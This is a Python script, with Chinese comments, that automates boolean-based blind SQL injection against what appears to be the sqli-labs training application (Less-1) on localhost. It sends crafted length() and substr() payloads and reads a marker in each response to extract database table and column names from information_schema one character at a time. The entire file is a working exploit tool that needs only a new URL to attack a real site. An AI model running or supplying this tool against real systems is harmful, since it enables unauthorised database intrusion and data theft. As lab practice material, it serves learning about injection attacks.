#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
 * @Author whale4u
 * @Date 2021/5/6
 * @Version 1.0
"""

import string
import requests

# mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举
chr_str = string.ascii_lowercase + string.punctuation + string.digits

# payload
payload_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
payload_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database())"

# 获取长度payload
# 字符型
payload_len = "' and length({0})={1} --+"
# 数值型
# payload_len = "' and length({0})={1} --+"

# 获取表名payload，注意这里后面字符要用单引号括起来！否则总为真。
payload_name = "' and substr({0},{1},1)='{2}' --+"

# url
url = "http://127.0.0.1:8081/Less-1/?id=1"
# mark
mark = "Dumb"


class SQLInjector:
    def __init__(self, url, mark, payload):
        self.url = url
        self.mark = mark
        self.payload = payload

    def get_length(self):  # 先要获取payload长度才能遍历
        i = 1
        while True:
            # http://127.0.0.1:8081/Less-1/?id=1' and length({0})={1} --+
            full_url = (self.url + payload_len).format(self.payload, i)
            # http://127.0.0.1:8081/Less-1/?id=1' and length((select group_concat(column_name) \
            # from information_schema.columns where table_schema=database()))=1 --+
            req = requests.get(full_url)
            if self.mark in req.text:
                print("len: ", i)
                return i
                # break
            i += 1
    def get_name(self):
        length = self.get_length()
        output = ""
        # 从第1位开始遍历
        for i in range(1, length+1):
            for j in chr_str:
                # http://127.0.0.1:8081/Less-1/?id=1' and substr({0},{1},1)='{2}' --+
                full_url = (self.url + payload_name).format(self.payload, i, j)
                req = requests.get(full_url)
                if self.mark in req.text:
                    output = output + j
                    print("col/tab: ", output)
                    break


if __name__ == '__main__':
    # print(chr_str)
    sqli = SQLInjector(url, mark, payload_c)
    # sqli.get_length()
    sqli.get_name()